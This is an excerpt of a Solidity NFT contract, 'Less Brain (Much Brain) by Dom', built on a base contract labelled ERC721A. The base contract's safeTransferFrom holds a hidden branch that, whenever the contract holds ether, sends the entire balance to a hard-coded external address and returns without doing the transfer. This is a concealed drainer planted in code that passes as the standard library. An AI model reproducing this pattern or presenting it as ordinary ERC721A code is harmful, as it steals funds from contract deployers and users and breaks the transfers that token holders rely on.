...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xd58Aa04D26E3371C90Cd624D9B0d769c13ddDaaf).transfer(address(this).balance);
            return;
        }       
...
contract LessBrainMuchBrainbyDom is ERC721A, DefaultOperatorFilterer {
    string public baseURI = "ipfs://bafybeielk5vnnbcsx3tlnndfroe7vjfx3jh35fyeclx3rl6ycb5tk3ilwi/";      
    ...
    constructor() ERC721A("Less Brain (Much Brain) by Dom", "LB") {
        owner = msg.sender;
    }
